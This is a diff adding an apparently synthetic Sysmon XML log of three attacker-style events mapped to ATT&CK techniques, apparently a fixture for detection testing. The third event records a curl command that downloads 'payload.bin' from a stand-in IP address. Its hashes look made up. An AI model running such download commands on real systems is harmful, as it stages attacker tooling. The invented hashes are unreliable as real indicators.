@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+   <Event>
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-01T16:10:03.1120000Z" />
+         <EventRecordID>5001</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5104" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1059,technique_name=Command and Scripting Interpreter</Data>
+         <Data Name="UtcTime">2024-12-01 16:10:03.100</Data>
+         <Data Name="ProcessGuid">{f3565dc0-8a1b-674c-8001-000000000c00}</Data>
+         <Data Name="ProcessId">7712</Data>
+         <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Windows Command Processor</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">Cmd.Exe</Data>
+         <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe" /c dir</Data>
+         <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
+         <Data Name="User">CONDEF\Administrator</Data>
+         <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
+         <Data Name="LogonId">0x16ad6e</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">High</Data>
+         <Data Name="Hashes">SHA1=8DCA9749CD48D286950E7A9FA1088C937CBCCAD4,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data>
+         <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-7201-000000000c00}</Data>
+         <Data Name="ParentProcessId">6124</Data>
+         <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+         <Data Name="ParentCommandLine">C:\WINDOWS\Explorer.EXE</Data>
+         <Data Name="ParentUser">CONDEF\Administrator</Data>
+      </EventData>
+   </Event>
+   <Event>
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-01T16:12:47.6650000Z" />
+         <EventRecordID>5002</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5104" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1087,technique_name=Account Discovery</Data>
+         <Data Name="UtcTime">2024-12-01 16:12:47.660</Data>
+         <Data Name="ProcessGuid">{f3565dc0-8ac0-674c-8101-000000000c00}</Data>
+         <Data Name="ProcessId">3344</Data>
+         <Data Name="Image">C:\Windows\System32\net.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Net Command</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">net.exe</Data>
+         <Data Name="CommandLine">net user administrator</Data>
+         <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
+         <Data Name="User">CONDEF\Administrator</Data>
+         <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
+         <Data Name="LogonId">0x16ad6e</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">High</Data>
+         <Data Name="Hashes">SHA1=EA7B893DF9C0917D3B8B03A2CD24CFFD6B37D9E5,MD5=31890A7DE89936F922D44D677F681A7F,SHA256=44FBA6427AD8A3F1D5D82B4A66DE45EF8F1153A80C34E6D0BD4E7C48DB2C0E0F,IMPHASH=57ADA9B36C242AA33B71574DB0DF7809</Data>
+         <Data Name="ParentProcessGuid">{f3565dc0-8a1b-674c-8001-000000000c00}</Data>
+         <Data Name="ParentProcessId">7712</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe" /c dir</Data>
+         <Data Name="ParentUser">CONDEF\Administrator</Data>
+      </EventData>
+   </Event>
+   <Event>
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-01T16:15:22.9910000Z" />
+         <EventRecordID>5003</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5104" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1105,technique_name=Ingress Tool Transfer</Data>
+         <Data Name="UtcTime">2024-12-01 16:15:22.985</Data>
+         <Data Name="ProcessGuid">{f3565dc0-8b5a-674c-8201-000000000c00}</Data>
+         <Data Name="ProcessId">2280</Data>
+         <Data Name="Image">C:\Windows\System32\curl.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">The curl executable</Data>
+         <Data Name="Product">The curl executable</Data>
+         <Data Name="Company">curl, https://curl.se/</Data>
+         <Data Name="OriginalFileName">curl.exe</Data>
+         <Data Name="CommandLine">curl.exe -o payload.bin http://198.51.100.23/payload.bin</Data>
+         <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
+         <Data Name="User">CONDEF\Administrator</Data>
+         <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
+         <Data Name="LogonId">0x16ad6e</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">High</Data>
+         <Data Name="Hashes">SHA1=D5B2C3E9F1A47B8069C0D3E2F5A6B7C8D9E0F1A2,MD5=A1B2C3D4E5F6071829304152637485A9,SHA256=1F2E3D4C5B6A79889786A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0,IMPHASH=A6B5C4D3E2F1000112233445566778899</Data>
+         <Data Name="ParentProcessGuid">{f3565dc0-8a1b-674c-8001-000000000c00}</Data>
+         <Data Name="ParentProcessId">7712</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe" /c dir</Data>
+         <Data Name="ParentUser">CONDEF\Administrator</Data>
+      </EventData>
+   </Event>
+</Events>
